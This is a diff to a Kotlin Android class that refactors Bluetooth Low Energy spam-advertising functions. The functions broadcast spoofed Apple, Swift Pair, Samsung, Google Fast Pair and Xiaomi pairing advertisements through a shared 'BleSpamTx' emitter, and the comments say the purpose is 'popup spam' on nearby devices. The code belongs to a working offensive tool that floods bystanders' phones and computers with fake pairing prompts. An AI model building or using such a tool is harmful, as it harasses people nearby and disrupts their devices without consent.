@@ -84,24 +84,23 @@ class BluetoothAdvertiser {
      * avoids iPhones attempting a GATT connect + backoff (one more
      * reason Device with connectable=true never showed).
      *
-     * Legacy API holds a single instance per callback, so restart
-     * (stop→start) is required to push the next payload each iteration.
+     * All spam transmissions go through the shared [BleSpamTx] so the
+     * single legacy radio slot is never double-owned and identical frames
+     * don't churn stop/start cycles.
      */
     @RequiresPermission(Manifest.permission.BLUETOOTH_ADVERTISE)
     fun advertiseApple(payload: ByteArray): Boolean {
-        return advertiseLegacyRaw(
-            manufacturerId = 0x004C,
-            payload = payload,
-            // Popup spam: ADV_NONCONN_IND is scanned faster and avoids the
-            // target attempting a GATT connect + backoff.
-            connectable = false
+        return BleSpamTx.emit(
+            signature = "apple|${hex(payload)}",
+            connectable = false,
+            data = manufacturerData(0x004C, payload)
         )
     }
 
     /** Stops an [advertiseApple] session. */
     @RequiresPermission(Manifest.permission.BLUETOOTH_ADVERTISE)
     fun stopApple() {
-        stopLegacyOnly()
+        BleSpamTx.stop()
     }
 
     /**
@@ -115,17 +114,17 @@ class BluetoothAdvertiser {
      */
     @RequiresPermission(Manifest.permission.BLUETOOTH_ADVERTISE)
     fun advertiseSwiftPair(payload: ByteArray): Boolean {
-        return advertiseLegacyRaw(
-            manufacturerId = SwiftPairPayloads.COMPANY_ID,
-            payload = payload,
-            connectable = false
+        return BleSpamTx.emit(
+            signature = "swift|${hex(payload)}",
+            connectable = false,
+            data = manufacturerData(SwiftPairPayloads.COMPANY_ID, payload)
         )
     }
 
     /** Stops an [advertiseSwiftPair] session. */
     @RequiresPermission(Manifest.permission.BLUETOOTH_ADVERTISE)
     fun stopSwiftPair() {
-        stopLegacyOnly()
+        BleSpamTx.stop()
     }
 
     /**
@@ -144,21 +143,18 @@ class BluetoothAdvertiser {
                 .setIncludeDeviceName(false)
                 .build()
         }
-        return startLegacy(
-            AdvertiseData.Builder()
-                .addManufacturerData(0x0075, payload)
-                .setIncludeTxPowerLevel(false)
-                .setIncludeDeviceName(false)
-                .build(),
-            scan,
-            connectable = false
+        return BleSpamTx.emit(
+            signature = "samsung|${hex(payload)}",
+            connectable = false,
+            data = manufacturerData(0x0075, payload),
+            scanResponse = scan,
         )
     }
 
     /** Stops an [advertiseSamsung] session. */
     @RequiresPermission(Manifest.permission.BLUETOOTH_ADVERTISE)
     fun stopSamsung() {
-        stopLegacyOnly()
+        BleSpamTx.stop()
     }
 
     /**
@@ -170,22 +166,23 @@ class BluetoothAdvertiser {
     @RequiresPermission(Manifest.permission.BLUETOOTH_ADVERTISE)
     fun advertiseFastPair(serviceData: ByteArray): Boolean {
         val uuid = android.os.ParcelUuid.fromString("0000FE2C-0000-1000-8000-00805F9B34FB")
-        return startLegacy(
-            AdvertiseData.Builder()
-                .addServiceUuid(uuid)
-                .addServiceData(uuid, serviceData)
-                .setIncludeTxPowerLevel(true)
-                .setIncludeDeviceName(false)
-                .build(),
-            null,
-            connectable = false
+        val data = AdvertiseData.Builder()
+            .addServiceUuid(uuid)
+            .addServiceData(uuid, serviceData)
+            .setIncludeTxPowerLevel(true)
+            .setIncludeDeviceName(false)
+            .build()
+        return BleSpamTx.emit(
+            signature = "fastpair|${hex(serviceData)}",
+            connectable = false,
+            data = data,
         )
     }
 
     /** Stops an [advertiseFastPair] session. */
     @RequiresPermission(Manifest.permission.BLUETOOTH_ADVERTISE)
     fun stopFastPair() {
-        stopLegacyOnly()
+        BleSpamTx.stop()
     }
 
     /**
@@ -194,30 +191,28 @@ class BluetoothAdvertiser {
      */
     @RequiresPermission(Manifest.permission.BLUETOOTH_ADVERTISE)
     fun advertiseXiaomi(payload: ByteArray): Boolean {
-        return advertiseLegacyRaw(
-            manufacturerId = 0x038F,
-            payload = payload,
-            connectable = false
+        return BleSpamTx.emit(
+            signature = "xiaomi|${hex(payload)}",
+            connectable = false,
+            data = manufacturerData(0x038F, payload)
         )
     }
 
     /** Stops an [advertiseXiaomi] session. */
     @RequiresPermission(Manifest.permission.BLUETOOTH_ADVERTISE)
     fun stopXiaomi() {
-        stopLegacyOnly()
+        BleSpamTx.stop()
     }
 
-    private fun advertiseLegacyRaw(manufacturerId: Int, payload: ByteArray, connectable: Boolean): Boolean {
-        return startLegacy(
-            AdvertiseData.Builder()
-                .addManufacturerData(manufacturerId, payload)
-                .setIncludeTxPowerLevel(false)
-                .setIncludeDeviceName(false)
-                .build(),
-            null,
-            connectable
-        )
-    }
+    private fun manufacturerData(manufacturerId: Int, payload: ByteArray): AdvertiseData =
+        AdvertiseData.Builder()
+            .addManufacturerData(manufacturerId, payload)
+            .setIncludeTxPowerLevel(false)
+            .setIncludeDeviceName(false)
+            .build()
+
+    private fun hex(bytes: ByteArray): String =
+        bytes.joinToString("") { "%02X".format(it.toInt() and 0xFF) }
 
     private fun startLegacy(
         advertiseData: AdvertiseData,
